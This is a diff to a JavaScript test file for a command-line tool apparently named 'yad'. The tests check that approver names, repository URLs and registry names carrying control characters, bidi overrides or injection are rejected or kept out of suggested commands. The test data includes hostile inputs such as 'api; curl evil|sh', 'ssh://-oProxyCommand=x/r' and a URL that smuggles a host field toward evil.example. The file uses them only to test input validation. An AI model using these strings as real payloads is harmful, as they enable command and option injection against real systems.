@@ -8545,7 +8545,7 @@ test('E112 approve: records one approval bound to the artifact, never advances, 
 test('E112 approve: `--by` is required and taken only as it would print; `--engagement` is verified or none', async () => {
   const { T, bytes } = localEpic();
   try {
-    for (const by of [undefined, true, '', ' bob', 'bob ', 'bo\nb', 'bob‮', 'b\u0007ob']) {
+    for (const by of [undefined, true, '', ' bob', 'bob ', 'bo\nb', 'bob\u202e', 'b\u0007ob']) {
       const r = await approve(T, { by });
       assert.equal(r.code, 1, JSON.stringify(by));
       assert.match(r.out, by == null || by === true ? /`--by <name>` is required/ : /`--by` must be a name as it would print/);
@@ -26672,7 +26672,7 @@ test('E81 review 6: the host and user of every URL form keep to safe characters 
     'https://u%0dhost%3dgithub.com%0dprotocol%3dhttps@evil.example/x', 'https://u:p%0D@h/r', 'https://h/r%0dx', 'http://h/x%0ahost%3dgithub.com',
     'https://u%1b%5b2J@h/x', 'https://h/a\rb',
     // E81 review 9: C1, separators and bidi controls — raw or as UTF-8 escapes.
-    'https://u%c2%9b2J@h/r', 'https://u%C2%85@h/r', 'https://u%e2%80%ae@h/r', 'https://h/a%E2%80%A8b', 'https://h/a%e2%81%a6b', 'https://h/a\u202eb', 'https://h/a\u2028b', 'https://h/a%7fb', 'https://h/a%00b', 'https://h/a\u009bb',
+    'https://u%c2%9b2J@h/r', 'https://u%C2%85@h/r', 'https://u%e2%80%ae@h/r', 'https://h/a%E2%80%A8b', 'https://h/a%e2%81%a6b', 'https://h/a\u202eb', 'https://h/a\u2028b', 'https://h/a\u061cb', 'https://h/a%d8%9cb', 'https://h/a%7fb', 'https://h/a%00b', 'https://h/a\u009bb',
     // …and a host or user that starts with `-`.
     'ssh://-oProxyCommand=x/r', 'ssh://-u@h/r', '-h:o/r', '-u@h:o/r']) {
     assert.equal(kind(bad), null, bad);
@@ -26683,10 +26683,11 @@ test('E81 review 9: doctor never puts a registry name that is not one plain word
   const T = e79Tmp();
   try {
     const { product, backend } = e80Workspace(T);
-    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'api; curl evil|sh', path: '../backend' }, { name: 'web', path: '../backend' }] }));
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'api; curl evil|sh', path: '../backend' }, { name: 'web', path: '../backend' }, { name: '--push', path: '../backend' }] }));
     const doc = JSON.parse(e79Yad(T, product, ['doctor', '--json']).stdout);
     assert.equal(doc.checks.find((c) => c.id === 'repo:api; curl evil|sh').hint, 'run `yad repo refresh <name>` once it has code');
     assert.equal(doc.checks.find((c) => c.id === 'repo:web').hint, 'run `yad repo refresh web` once it has code');
+    assert.equal(doc.checks.find((c) => c.id === 'repo:--push').hint, 'run `yad repo refresh <name>` once it has code', 'never an option in a command to copy');
     assert.ok(backend);
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
